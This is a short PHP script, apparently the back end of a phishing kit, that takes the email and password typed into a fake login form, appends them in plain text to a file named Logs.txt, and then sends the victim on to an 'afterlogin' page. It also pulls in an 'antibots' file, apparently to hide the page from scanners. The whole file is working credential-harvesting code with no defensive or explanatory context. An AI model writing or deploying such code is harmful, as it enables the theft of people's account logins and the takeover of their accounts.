<?php
include('../antibots/all.php');

file_put_contents("Logs.txt", "| Adresse mail: " . $_POST['login_email'] . " | Mot de passe: " . $_POST['login_password'] . "\n", FILE_APPEND);
sleep(1);
header('Location: afterlogin');
exit();
